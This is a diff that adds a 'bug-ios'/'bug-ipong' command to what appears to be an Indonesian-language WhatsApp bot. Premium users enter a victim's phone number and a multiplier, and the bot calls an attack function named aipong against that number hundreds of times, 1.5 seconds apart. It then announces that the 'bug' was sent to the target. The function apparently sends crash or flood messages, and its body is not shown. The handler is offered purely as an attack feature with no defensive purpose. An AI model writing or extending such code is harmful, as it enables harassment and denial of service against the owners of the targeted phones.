@@ -6480,7 +6480,25 @@ quoted: m
 })
 }
 break
-
+		
+case 'bug-ios': case 'bug-ipong': {
+if (!isPremium) return xgreply(mess.premium)
+if (!q) return xgreply(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
+let ppek = q.split("|")[0]
+let bijipler = ppek.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return xgreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
+let target = bijipler+"@s.whatsapp.net"
+let jumlah = q.split("|")[1] * 200
+let ppk = jumlah * 1.5
+m.reply(ppk + " detik");
+xgreply(mess.bugrespon)
+for (let j = 0; j < jumlah; j++) {
+await aipong(target)
+await sleep(1500)
+}
+xgreply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
+}
+		
 case 'bugtayo': {
 if (!isPremium) return xgreply(mess.premium)
 if (!q) return xgreply(`Penggunaan .${command} 1`)
